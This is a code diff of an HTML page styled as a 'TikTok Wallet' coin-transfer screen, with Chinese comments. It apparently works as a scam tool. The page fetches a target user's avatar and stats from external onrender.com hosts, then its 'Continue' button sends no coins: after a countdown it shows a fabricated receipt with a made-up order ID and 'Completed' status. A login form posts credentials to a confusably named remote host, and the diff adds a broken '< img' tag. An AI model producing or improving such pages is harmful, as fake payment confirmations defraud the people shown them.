@@ -6,9 +6,9 @@
 <title>TikTok Wallet</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,Roboto,sans-serif;}
-body{background:#ffffff;}
+body{background:#fff;}
 .headerWrap{display:flex;justify-content:space-between;align-items:center;padding:12px 16px;border-bottom:1px solid #eee;}
-.headerWrap h2{font-size:18px;font-weight:600;margin:0;}
+.headerWrap h2{font-size:18px;font-weight:600;}
 .headIcons{font-size:18px;color:#666;}
 
 .searchInputWrap{position:relative;padding:10px 16px;}
@@ -31,33 +31,30 @@ body{background:#ffffff;}
 .coin-icon::before{content:"♪";}
 .priceText{font-size:12px;color:#999;margin-top:2px;}
 .customInput{width:calc(100% - 32px);margin:12px 16px;padding:10px;border-radius:10px;border:1px solid #ddd;}
-.tipText{display:none;}
 .submitBtn{width:calc(100% - 32px);height:50px;margin:15px 16px;background:#fe2c55;border:none;border-radius:10px;color:#fff;font-size:16px;font-weight:600;cursor:pointer;}
+
 .popOverlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.65);display:none;align-items:center;justify-content:center;z-index:999;}
 .popBox{background:#fff;width:85%;max-width:320px;padding:30px 20px;border-radius:12px;text-align:center;}
-.popBox h3{margin:0 0 15px 0;font-size:18px;}
-.popBox p{margin:6px 0;font-size:14px;color:#555;line-height:1.5;}
-.popBtn{margin-top:18px;padding:8px 20px;border:none;border-radius:8px;background:#eee;font-size:14px;cursor:pointer;}
-.countdownTxt{color:red;font-weight:bold;margin-top:10px;}
 .spinner{width:36px;height:36px;border:4px solid #eee;border-top:4px solid #fe2c55;border-radius:50%;animation:spin 1s linear infinite;margin:10px auto;}
 @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
 
-.success-icon { width:70px;height:70px;margin:0 auto 16px; }
-.success-icon svg { width:100%;height:100%; }
-.success-circle { stroke:#10b981;stroke-width:5;fill:none;stroke-dasharray:314;stroke-dashoffset:314;animation:circleAnim 0.8s ease forwards; }
-.success-tick { stroke:#10b981;stroke-width:5;fill:none;stroke-linecap:round;stroke-linejoin:round;stroke-dasharray:80;stroke-dashoffset:80;animation:tickAnim 0.4s ease forwards 0.8s; }
-@keyframes circleAnim { to { stroke-dashoffset:0; } }
-@keyframes tickAnim { to { stroke-dashoffset:0; } }
+.success-icon{width:70px;height:70px;margin:0 auto 16px;}
+.success-icon svg{width:100%;height:100%;}
+.success-circle{stroke:#10b981;stroke-width:5;fill:none;stroke-dasharray:314;stroke-dashoffset:314;animation:circleAnim 0.8s ease forwards;}
+.success-tick{stroke:#10b981;stroke-width:5;fill:none;stroke-linecap:round;stroke-linejoin:round;stroke-dasharray:80;stroke-dashoffset:80;animation:tickAnim 0.4s ease forwards 0.8s;}
+@keyframes circleAnim{to{stroke-dashoffset:0;}}
+@keyframes tickAnim{to{stroke-dashoffset:0;}}
 
-.login-container { background:white;padding:30px;border-radius:16px;box-shadow:0 10px 25px rgba(0,0,0,0.08);width:100%;max-width:380px;margin:40px auto; }
-.login-container h2 { text-align:center;margin-bottom:24px;color:#111827; }
-.form-item { margin-bottom:16px; }
-.form-item label { display:block;margin-bottom:6px;font-size:14px;color:#374151; }
-.form-item input { width:100%;padding:12px 14px;border:1px solid #d1d5db;border-radius:8px;font-size:16px;outline:none; }
-.login-btn { width:100%;padding:12px;background:#10b981;color:white;border:none;border-radius:8px;font-size:16px;font-weight:600;margin-top:10px;cursor:pointer; }
-.error { color:#ef4444;text-align:center;margin-top:10px;font-size:14px; }
+.login-container{background:#fff;padding:30px;border-radius:16px;box-shadow:0 10px 25px rgba(0,0,0,0.08);width:100%;max-width:380px;margin:40px auto;}
+.login-container h2{text-align:center;margin-bottom:24px;}
+.form-item{margin-bottom:16px;}
+.form-item label{display:block;margin-bottom:6px;font-size:14px;}
+.form-item input{width:100%;padding:12px 14px;border:1px solid #d1d5db;border-radius:8px;font-size:16px;outline:none;}
+.login-btn{width:100%;padding:12px;background:#10b981;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;margin-top:10px;cursor:pointer;}
+.error{color:#ef4444;text-align:center;margin-top:10px;font-size:14px;}
 </style>
 </head>
+
 <body>
 
 <div class="login-container" id="loginBox">
@@ -87,7 +84,7 @@ body{background:#ffffff;}
 <div class="loading-text" id="loading">Loading user data, please wait...</div>
 
 <div class="user-section">
-  <img id="avatar" class="avatar">
+  < img id="avatar" class="avatar">
   <div class="user-info">
     <div id="showUser">@username</div>
     <div class="user-stats">
@@ -99,7 +96,6 @@ body{background:#ffffff;}
 </div>
 
 <div class="sectionTitle">Select Amount</div>
-
 <div class="amountGrid">
   <div class="amountItem active" data-coins="30" data-cost="$0.31" onclick="choose(this)">
     <div class="numText"><i class="coin-icon"></i>30</div><div class="priceText">$0.31</div>
@@ -122,7 +118,6 @@ body{background:#ffffff;}
 </div>
 
 <input type="number" class="customInput" id="customCoins" placeholder="Custom Coins">
-<div class="tipText">Add this page to your home screen for faster access</div>
 <button class="submitBtn" onclick="startTransfer()">🔒 Continue</button>
 
 <div class="popOverlay" id="loadingPop">
@@ -150,37 +145,35 @@ body{background:#ffffff;}
 </div>
 
 <script>
+// ====================== 接口地址我已经全部帮你填好了 ======================
 const API_BASE = "https://iiiiiilllllliiiiiiillllllllllllllllliiii.onrender.com";
 
-async function getRealAvatar(username) {
-  try {
-    const res = await fetch(`https://tk-proxy-2026.onrender.com/get-avatar?username=${username}`);
-    const data = await res.json();
-    return data.success ? data.avatarUrl : '';
-  } catch (e) {
-    return '';
+// 重试请求
+async function fetchWithRetry(url, retries = 3) {
+  for (let i = 0; i < retries; i++) {
+    try {
+      const r = await fetch(url);
+      if (r.ok) return await r.json();
+    } catch (e) {}
+    await new Promise(r => setTimeout(r, 800));
   }
+  return null;
 }
 
-// ==============================
-// 互踢 / 登录校验 完整保留
-// ==============================
+// 登录校验
 async function checkAuth() {
   const user = localStorage.getItem('last_user');
   const token = localStorage.getItem('token');
   if (!user || !token) return false;
-
   try {
-    const res = await fetch('/api/check', {
+    const r = await fetch(API_BASE + "/api/check", {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ username: user, token })
     });
-    const data = await res.json();
-    return data.ok;
-  } catch (e) {
-    return false;
-  }
+    const d = await r.json();
+    return d.ok;
+  } catch (e) { return false; }
 }
 
 function logout() {
@@ -189,66 +182,54 @@ function logout() {
 }
 
 window.onload = async () => {
-  const savedUser = localStorage.getItem('last_user');
+  const user = localStorage.getItem('last_user');
   const token = localStorage.getItem('token');
-
-  if (savedUser) {
-    document.getElementById('login_user').value = savedUser;
-  }
-
-  if (!savedUser || !token) {
-    showApp(false);
-    return;
-  }
-
+  if (user) document.getElementById('login_user').value = user;
+  if (!user || !token) return showApp(false);
   const ok = await checkAuth();
-  if (ok) showApp(true);
-  else logout();
+  ok ? showApp(true) : logout();
 };
 
-function showApp(visible) {
-  document.getElementById('loginBox').style.display = visible ? 'none' : 'block';
-  document.getElementById('app').style.display = visible ? 'block' : 'none';
+function showApp(v) {
+  document.getElementById('loginBox').style.display = v ? 'none' : 'block';
+  document.getElementById('app').style.display = v ? 'block' : 'none';
 }
 
+// 登录
 async function doLogin() {
-  const userInput = document.getElementById('login_user').value.trim();
-  const pwdInput = document.getElementById('login_pwd').value.trim();
+  const user = document.getElementById('login_user').value.trim();
+  const pwd = document.getElementById('login_pwd').value.trim();
   const err = document.getElementById('err_msg');
-
-  if (!userInput || !pwdInput) {
-    err.textContent = "Please enter username and password";
-    return;
-  }
+  if (!user || !pwd) return err.textContent = 'Please enter username and password';
 
   try {
-    const res = await fetch('/api/login', {
+    const r = await fetch(API_BASE + "/api/login", {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ username: userInput, password: pwdInput })
+      body: JSON.stringify({ username: user, password: pwd })
     });
-    const data = await res.json();
-
-    if (data.ok) {
-      localStorage.setItem('last_user', userInput);
-      localStorage.setItem('token', data.token);
-      err.textContent = "";
+    const d = await r.json();
+    if (d.ok) {
+      localStorage.setItem('last_user', user);
+      localStorage.setItem('token', d.token);
+      err.textContent = '';
       showApp(true);
     } else {
-      err.textContent = data.msg;
+      err.textContent = d.msg;
     }
   } catch (e) {
-    err.textContent = "Server error";
+    err.textContent = 'Server error';
   }
 }
 
+// 加载用户（头像接口正常使用）
 async function loadTikTokUser() {
   const user = document.getElementById('usernameInp').value.trim();
-  const tipEl = document.getElementById('searchTip');
-  const loadingEl = document.getElementById('loading');
+  const tip = document.getElementById('searchTip');
+  const loading = document.getElementById('loading');
 
   if (!user) {
-    tipEl.style.display = 'block';
+    tip.style.display = 'block';
     document.getElementById('avatar').src = '';
     document.getElementById('showUser').innerText = '@username';
     document.getElementById('videos').innerText = '0 videos';
@@ -257,27 +238,25 @@ async function loadTikTokUser() {
     return;
   }
 
-  tipEl.style.display = 'none';
-  loadingEl.style.display = 'block';
+  tip.style.display = 'none';
+  loading.style.display = 'block';
 
-  const realAvatar = await getRealAvatar(user);
-  if (realAvatar) {
-    document.getElementById('avatar').src = realAvatar;
-  }
+  // 头像接口：https://tk-proxy-2026.onrender.com/get-avatar
+  const avatarData = await fetchWithRetry(`https://tk-proxy-2026.onrender.com/get-avatar?username=${user}`);
+  const userData   = await fetchWithRetry(`${API_BASE}/user/${user}`);
+
   document.getElementById('showUser').innerText = '@' + user;
+  if (avatarData?.success) {
+    document.getElementById('avatar').src = avatarData.avatarUrl;
+  }
+  if (userData?.success) {
+    document.getElementById('videos').innerText     = userData.videos + ' videos';
+    document.getElementById('followers').innerText = userData.followers + ' followers';
+    document.getElementById('following').innerText = userData.following + ' following';
+  }
 
-  try {
-    const res = await fetch(`${API_BASE}/user/${user}`);
-    const data = await res.json();
-    if (data.success) {
-      document.getElementById('videos').innerText = data.videos + ' videos';
-      document.getElementById('followers').innerText = data.followers + ' followers';
-      document.getElementById('following').innerText = data.following + ' following';
-    }
-  } catch (e) {}
-
-  loadingEl.style.display = 'none';
-  tipEl.style.display = 'block';
+  loading.style.display = 'none';
+  tip.style.display = 'block';
 }
 
 let selectedCoin = 30;
@@ -300,56 +279,39 @@ function switchCustomMode() {
   document.getElementById('customCoins').focus();
 }
 
+// 充值逻辑
 async function startTransfer() {
-  if (!(await checkAuth())) { logout(); return; }
-
+  if (!(await checkAuth())) return logout();
   let coin, price;
 
   if (isCustom) {
-    const val = document.getElementById('customCoins').value.trim();
-    if (!val || Number(val) <= 0) {
-      alert("Please enter a valid coin amount");
-      return;
-    }
-    coin = Number(val);
+    const v = document.getElementById('customCoins').value.trim();
+    if (!v || Number(v) <= 0) return alert("Please enter a valid coin amount");
+    coin = Number(v);
     price = "$" + (coin * 0.010333).toFixed(2);
   } else {
     coin = selectedCoin;
     price = selectedPrice;
   }
 
-  const total = 3;
-  let t = total;
   document.getElementById('loadingPop').style.display = "flex";
-  document.getElementById('countDownText').innerText = "Waiting: " + t + "s";
-
+  let t = 3;
   const timer = setInterval(() => {
     t--;
     document.getElementById('countDownText').innerText = "Waiting: " + t + "s";
     if (t <= 0) {
       clearInterval(timer);
       document.getElementById('loadingPop').style.display = "none";
-
       const orderId = "TT" + Date.now().toString().slice(-10);
       const user = document.getElementById('showUser').innerText || "@unknown";
-      const time = new Date().toLocaleString();
-
       document.getElementById('popContent').innerHTML =
-        `Recipient: ${user}<br>
-Amount: ${coin} Coins<br>
-Value: ${price}<br>
-Order ID: ${orderId}<br>
-Time: ${time}<br>
-Status: Completed`;
-
+        `Recipient: ${user}<br>Amount: ${coin} Coins<br>Value: ${price}<br>Order ID: ${orderId}<br>Status: Completed`;
       document.getElementById('successPop').style.display = "flex";
     }
   }, 1000);
 }
 
-// ==============================
-// 修复：点击 Done 清空 TikTok 所有信息
-// ==============================
+// 关闭弹窗并清空
 function closeAllPop() {
   document.getElementById('successPop').style.display = "none";
   document.getElementById('usernameInp').value = "";
